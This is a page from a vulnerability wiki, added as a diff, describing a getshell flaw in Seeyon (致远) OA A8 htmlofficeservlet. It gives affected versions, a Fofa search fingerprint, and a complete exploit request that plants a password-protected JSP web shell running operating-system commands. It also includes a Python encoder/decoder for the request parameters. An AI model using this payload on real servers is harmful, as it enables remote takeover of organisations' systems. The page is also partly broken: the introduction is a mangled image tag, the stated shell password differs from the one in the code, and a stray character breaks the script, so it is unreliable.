@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9Coa/%E8%87%B4%E8%BF%9C%20OA%20A8%20htmlofficeservlet%20getshell%20%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>致远 OA A8 htmlofficeservlet getshell 漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u81f4\u8fdc OA A8 htmlofficeservlet getshell \u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_5" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E8%87%B4%E8%BF%9CM1%20usertokenservice%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E8%87%B4%E8%BF%9CM1%20usertokenservice%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        致远M1 usertokenservice 反序列化RCE漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3open_juese%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3open_juese%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        致翔OA系统接口open_juese存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="oa-a8-htmlofficeservlet-getshell">致远 OA A8 htmlofficeservlet getshell 漏洞<a class="headerlink" href="#oa-a8-htmlofficeservlet-getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>访问https://wiki.0-sec.org/img
+src=\"<a href="https://wiki.0-sec.org/img/19f51e83094c4ce79a3da658a24f961b.png">https://wiki.0-sec.org/img/19f51e83094c4ce79a3da658a24f961b.png</a>\"
+alt=\"1.png\" class=\"large\" onclick=\"window.open(this.src)\" /&gt;</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>致远A8-V5协同管理软件 V6.1sp1</p>
+<p>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3</p>
+<p>致远A8+协同管理软件 V7.1</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">指纹<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>https://www.0-sec.org/seeyon/htmlofficeservlet/seeyon/index.jsp
+seeyon
+Fofa：app=&quot;用友-致远OA&quot;
+</code></pre></div>
+
+<p><img alt="0d4b978ed1474946.png" src="../resource/%E8%87%B4%E8%BF%9COAA8htmlofficeservletgetshell%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="nv">DBSTEP</span> <span class="nv">V3</span><span class="mf">.0</span>     <span class="mi">355</span>             <span class="mi">0</span>               <span class="mi">666</span>             <span class="nv">DBSTEP</span><span class="o">=</span><span class="nv">OKMLlKlV</span>
+<span class="nv">OPTION</span><span class="o">=</span><span class="nv">S3WYOSWLBSGr</span>
+<span class="s s-Atom">currentUserId</span><span class="o">=</span><span class="s s-Atom">zUCTwigsziCAPLesw4gsw4oEwV66</span>
+<span class="nv">CREATEDATE</span><span class="o">=</span><span class="s s-Atom">wUghPB3szB3Xwg66</span>
+<span class="nv">RECORDID</span><span class="o">=</span><span class="s s-Atom">qLSGw4SXzLeGw4V3wUw3zUoXwid6</span>
+<span class="s s-Atom">originalFileId</span><span class="o">=</span><span class="s s-Atom">wV66</span>
+<span class="s s-Atom">originalCreateDate</span><span class="o">=</span><span class="s s-Atom">wUghPB3szB3Xwg66</span>
+<span class="nv">FILENAME</span><span class="o">=</span><span class="s s-Atom">qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6</span>
+<span class="s s-Atom">needReadFile</span><span class="o">=</span><span class="s s-Atom">yRWZdAS6</span>
+<span class="s s-Atom">originalCreateDate</span><span class="o">=</span><span class="s s-Atom">wLSGP4oEzLKAz4</span><span class="o">=</span><span class="s s-Atom">iz</span><span class="o">=</span><span class="mi">66</span>
+<span class="s s-Atom">&lt;</span><span class="c1">%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+&quot;\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if(&quot;asasd33445&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;)) + &quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt;6e4f045d4b8506bf492ada7e3390d7ce</span>
+</code></pre></div>
+
+<p>webshell地址为**<a href="https://www.0-sec.org/seeyon/test123456.jsp">https://www.0-sec.org/seeyon/test123456.jsp</a>**，密码为：asasd3344。</p>
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">sys</span><span class="w"> </span><span class="kn">import</span> <span class="n">argv</span>
+
+<span class="n">letters</span> <span class="o">=</span> <span class="s2">&quot;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&quot;</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">base64_encode</span><span class="p">(</span><span class="n">input_str</span><span class="p">):</span>
+    <span class="n">str_ascii_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;</span><span class="si">{:0&gt;8}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0b&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
+                      <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">input_str</span><span class="p">]</span>
+    <span class="n">output_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">equal_num</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">str_ascii_list</span><span class="p">:</span>
+        <span class="n">temp_list</span> <span class="o">=</span> <span class="n">str_ascii_list</span><span class="p">[:</span><span class="mi">3</span><span class="p">]</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp_list</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+            <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp_list</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="n">equal_num</span> <span class="o">+=</span> <span class="mi">1</span>
+                <span class="n">temp_list</span> <span class="o">+=</span> <span class="p">[</span><span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">]</span>
+        <span class="n">temp_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">temp_list</span><span class="p">)</span>
+        <span class="n">temp_str_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">temp_str</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">18</span><span class="p">]]</span>
+        <span class="n">temp_str_list</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">temp_str_list</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">equal_num</span><span class="p">:</span>
+            <span class="n">temp_str_list</span> <span class="o">=</span> <span class="n">temp_str_list</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span> <span class="o">-</span> <span class="n">equal_num</span><span class="p">]</span>
+        <span class="n">output_str</span> <span class="o">+=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">letters</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">temp_str_list</span><span class="p">])</span>
+        <span class="n">str_ascii_list</span> <span class="o">=</span> <span class="n">str_ascii_list</span><span class="p">[</span><span class="mi">3</span><span class="p">:]</span>
+    <span class="n">output_str</span> <span class="o">=</span> <span class="n">output_str</span> <span class="o">+</span> <span class="s1">&#39;=&#39;</span> <span class="o">*</span> <span class="n">equal_num</span>
+    <span class="k">return</span> <span class="n">output_str</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">base64_decode</span><span class="p">(</span><span class="n">input_str</span><span class="p">):</span>
+    <span class="n">str_ascii_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;</span><span class="si">{:0&gt;6}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">letters</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0b&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
+                      <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">input_str</span> <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="s1">&#39;=&#39;</span><span class="p">]</span>
+    <span class="n">output_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">equal_num</span> <span class="o">=</span> <span class="n">input_str</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">str_ascii_list</span><span class="p">:</span>
+        <span class="n">temp_list</span> <span class="o">=</span> <span class="n">str_ascii_list</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
+        <span class="n">temp_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">temp_list</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp_str</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">temp_str</span> <span class="o">=</span> <span class="n">temp_str</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span> <span class="o">*</span> <span class="n">equal_num</span> <span class="o">*</span> <span class="mi">2</span><span class="p">]</span>
+        <span class="n">temp_str_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">temp_str</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">]]</span>
+        <span class="n">temp_str_list</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">temp_str_list</span> <span class="k">if</span> <span class="n">x</span><span class="p">]</span>
+        <span class="n">output_str</span> <span class="o">+=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">temp_str_list</span><span class="p">])</span>
+        <span class="n">str_ascii_list</span> <span class="o">=</span> <span class="n">str_ascii_list</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
+    <span class="k">return</span> <span class="n">output_str</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-d&#39;</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">base64_encode</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Seeyon OA /seeyon/htmlofficeservlet param encode/decode&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Usage:&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;python </span><span class="si">%s</span><span class="s2"> encoded_str&quot;</span> <span class="o">%</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="n">t</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;python </span><span class="si">%s</span><span class="s2"> -d encoded_str&quot;</span> <span class="o">%</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;python </span><span class="si">%s</span><span class="s2"> -e raw_str&quot;</span> <span class="o">%</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</code></pre></div>
+
+<h2 id="_5">参考链接<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://github.com/nian-hua/CVEScript/blob/master/致远OA/zhiyuan.py">https://github.com/nian-hua/CVEScript/blob/master/致远OA/zhiyuan.py</a></p>
+<p><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E8%87%B4%E8%BF%9CM1%20usertokenservice%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E8%87%B4%E8%BF%9CM1%20usertokenservice%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        致远M1 usertokenservice 反序列化RCE漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3open_juese%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3open_juese%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        致翔OA系统接口open_juese存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
